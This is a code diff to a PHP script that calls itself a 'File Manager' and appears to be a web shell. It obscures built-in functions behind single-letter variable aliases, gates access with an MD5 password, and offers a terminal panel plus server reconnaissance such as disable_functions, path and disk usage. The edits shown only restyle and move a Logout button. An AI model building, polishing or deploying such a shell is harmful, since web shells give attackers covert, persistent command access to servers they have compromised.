@@ -8,7 +8,7 @@ $c("memory_limit", "256M");
 $b("Content-Type: text/html; charset=UTF-8");
 $APP_NAME = "File Manager";
 $BASE_PATH = $e();
-$PASSWORD_MD5 = "a84e5f25e7f6d5de9b82ce3f64d1b8fa";//ganti password anda disini!!
+$PASSWORD_MD5 = "a84e5f25e7f6d5de9b82ce3f64d1b8fa";
 if(isset($_POST['login'])){
     $pass = $_POST['password'];
     if($a($pass) === $PASSWORD_MD5){
@@ -137,6 +137,8 @@ td{position:relative;}
 .breadcrumb a{margin-right:5px;color:#1abc9c;}
 .msg-box{margin-top:5px;padding:5px;background:#111;border:1px solid #24ff03;border-radius:4px;color:#24ff03;}
 #toggleTerminalBtn{background:#f39c12;color:#111;border:none;padding:3px 6px;border-radius:3px;cursor:pointer;}
+.logout-btn{background:#e67e22;color:#fff;border:none;padding:3px 8px;border-radius:3px;cursor:pointer;margin-left:5px;text-decoration:none;display:inline-block;font-size:12px;}
+.logout-btn:hover{background:#d35400;}
 .modal{display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#111;border:1px solid #7d3c98;border-radius:6px;padding:10px;z-index:2000;width:80%;max-width:600px;}
 .modal textarea{width:100%;height:300px;}
 .modal h3{color:#f1c40f;margin:0 0 5px 0;}
@@ -171,7 +173,7 @@ document.addEventListener('click', function(e){
 </script>
 </head>
 <body>
-<h1 onclick="goHome()"><?=$APP_NAME?> | <a href="?logout=1" onclick="event.stopPropagation();">Logout</a></h1>
+<h1 onclick="goHome()"><?=$APP_NAME?></h1>
 <div id="terminalBox">
   <button onclick="toggleTerminal()">[X]</button>
   <h3>Terminal</h3>
@@ -188,7 +190,10 @@ PHP: <?=$h();?><br>
 Disable: <?=$i('disable_functions')?><br>
 Path: <?=$path?><br>
 Disk: <?=round($f($path)/1024/1024,2)?> MB / <?=round($g2($path)/1024/1024,2)?> MB
-<div><button type="button" id="toggleTerminalBtn" onclick="toggleTerminal()">Toggle Terminal</button></div>
+<div style="margin-top:10px; display:flex; gap:8px; align-items:center;">
+    <button type="button" id="toggleTerminalBtn" onclick="toggleTerminal()">Toggle Terminal</button>
+    <a href="?logout=1" class="logout-btn" onclick="event.stopPropagation();">Logout</a>
+</div>
 </div>
 <div class="breadcrumb" style="margin:10px;">
 <?php
